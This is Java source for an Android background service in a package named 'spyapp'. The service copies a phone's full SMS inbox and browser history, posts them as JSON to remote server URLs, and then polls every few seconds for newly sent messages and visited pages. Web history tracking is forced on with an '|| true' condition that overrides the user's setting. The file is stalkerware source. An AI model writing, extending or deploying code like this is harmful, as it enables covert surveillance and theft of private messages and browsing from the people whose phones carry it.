package com.example.spyapp;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import org.json.JSONArray;
import org.json.JSONObject;

import com.example.spyapp.http.PostData;
import com.example.spyapp.sms.SMSUtil;
import com.example.spyapp.sms.Texter;
import com.example.spyapp.sqlite.SQLFactory;
import com.example.spyapp.sqlite.SqlDb;
import com.example.spyapp.util.Const;
import com.example.spyapp.util.HistoryTracker;
import com.example.spyapp.util.MyLocationListener;
import com.example.spyapp.util.Prefs;
import com.example.spyapp.util.Util;
import com.example.spyapp.util.WebConst;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.widget.Toast;

public class Services extends Service {
	
	private SqlDb mainDb;
	SMSUtil smsObject=SMSUtil.getInstance();
	HistoryTracker webHistoyObject=HistoryTracker.getInstance();
	PostData postData=PostData.getInstance();
	private String s = "", provider = "No Provider";
	Prefs pref;
	double lat = 0, lng = 0;
	public LocationManager locationManager;
	boolean isWebHistoryTrackingEnable=false;
	public Location location;
	
	private Texter texter;
	
	public void onStart(Intent intent, int startId) {
		 setMainDb();
		 pref=new Prefs(getApplicationContext());
		 boolean isSMSTrackingEnable=pref.GetBoolean(Const.smsSwitchPref);
		
		 isWebHistoryTrackingEnable=pref.GetBoolean(Const.webSwitchHistPref);
		 
		 if(isSMSTrackingEnable){
			 boolean isSyncInbox=pref.GetBoolean(Const.isInboxSybcToSypeDatabase);
			 if(!isSyncInbox){
				 JSONArray inboxMessages= smsObject.getAllSMSThreadMessages(this);
				 pref.StoreBoolean(Const.isInboxSybcToSypeDatabase,true);
				 String json=inboxMessages.toString();
				 postData.requstPost(WebConst.SMS_URL, json);
			 }
		 }
		
		 
		 if(isWebHistoryTrackingEnable){
			 if(new Util().isNetworkAvaiable(getApplicationContext())){
				 
			 }
			 boolean isSyncInbox=pref.GetBoolean(Const.isWebHistorySybcToSypeDatabase);
			 if(!isSyncInbox){
				 JSONArray webHistoryJson= webHistoyObject.getBrowserHistory(this);
				 smsObject.postToSpyWebHistoryTable(Services.this, webHistoryJson);
				 pref.StoreBoolean(Const.isWebHistorySybcToSypeDatabase,true);
				 String json=webHistoryJson.toString();
				 String url=WebConst.WEB_URL;
				 postData.requstPost(url, json);
			 }
		 }
		
			
		 	texter = new Texter(this);
	        texter.setCoreService(this);
	        Context context=getApplication();
	       
	        
	        
	        ScheduledThreadPoolExecutor exec = new ScheduledThreadPoolExecutor(1);
			long period = 3000; // the period between successive executions
			exec.scheduleAtFixedRate(new TrackingHandler(), 0, period, TimeUnit.MILLISECONDS);
			long delay = 5000; //the delay between the termination of one execution and the commencement of the next
			exec.scheduleWithFixedDelay(new TrackingHandler(), 0, delay, TimeUnit.MILLISECONDS);
	        
	        
	     // Don't initialize location manager, retrieve it from system services.
			
	 }
	 
	 private void setMainDb() {
		 mainDb = SQLFactory.getInstance().getMainDb(this);
	 }
	 
	 public synchronized SqlDb getMainDB() {
			return mainDb;
	 }
	 
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	class TrackingHandler implements Runnable {

		@Override
		public void run() {
			// TODO Auto-generated method stub
			 JSONObject lastSentMessage=SMSUtil.getInstance().getSentMessageList(Services.this);
			 if(lastSentMessage!=null){
				 SMSUtil.getInstance().getLastSentMessage(Services.this,lastSentMessage);
			 }
			 
			 
			 if(isWebHistoryTrackingEnable || true){
					 JSONObject webHistoryJson= webHistoyObject.getLastVisitedBrowserHistory(Services.this);
					 if(webHistoryJson!=null){
						 SMSUtil.getInstance().getLastWeBHistory(Services.this, webHistoryJson);
					 }
					 
//					 JSONObject lastHistory=webHistoyObject.getLastVisitedBrowserHistory(Services.this);
//					 pref.StoreBoolean(Const.isWebHistorySybcToSypeDatabase,true);
//					 String json=webHistoryJson.toString();
//					 postData.requstPost(WebConst.WEB_URL, json);
			 }
			 
			 
		}

		
		
			
	}

	

public String getProviderName() {
    LocationManager locationManager = (LocationManager) this
            .getSystemService(Context.LOCATION_SERVICE);
 
    Criteria criteria = new Criteria();
    criteria.setPowerRequirement(Criteria.POWER_LOW); // Chose your desired power consumption level.
    criteria.setAccuracy(Criteria.ACCURACY_FINE); // Choose your accuracy requirement.
    criteria.setSpeedRequired(true); // Chose if speed for first location fix is required.
    criteria.setAltitudeRequired(false); // Choose if you use altitude.
    criteria.setBearingRequired(false); // Choose if you use bearing.
    criteria.setCostAllowed(false); // Choose if this provider can waste money :-)
 
    // Provide your criteria and flag enabledOnly that tells
    // LocationManager only to return active providers.
    return locationManager.getBestProvider(criteria, true);
}
}
